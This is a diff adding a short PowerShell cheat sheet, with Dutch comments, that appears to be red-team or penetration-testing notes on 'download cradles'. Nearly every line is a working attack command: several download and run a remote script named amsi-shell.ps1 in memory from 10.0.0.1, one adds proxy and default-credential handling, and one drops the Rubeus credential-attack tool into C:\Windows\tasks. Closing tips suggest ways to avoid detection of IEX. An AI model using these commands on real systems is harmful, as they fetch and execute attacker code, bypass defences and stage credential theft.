@@ -1,0 +1,9 @@
+# PowerShell Download Cradle - WebClient (meest gebruikt)
+# Download + execute in memory (geen file op schijf)
+iex (New-Object Net.WebClient).DownloadString('http://10.0.0.1/payloads/amsi-shell.ps1')
+# Met proxy awareness:
+$wc=New-Object Net.WebClient;$wc.Proxy=[Net.WebRequest]::GetSystemWebProxy();$wc.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $wc.DownloadString('http://10.0.0.1/payloads/amsi-shell.ps1')
+# File downloaden naar schijf:
+(New-Object Net.WebClient).DownloadFile('http://10.0.0.1/tools/Rubeus.exe','C:\Windows\tasks\Rubeus.exe')
+# Tip: IEX = Invoke-Expression alias, wordt vaak gedetecteerd
+# Tip: Alternatief: iex(iwr ...) of $ExecutionContext.InvokeCommand.InvokeScript(...)
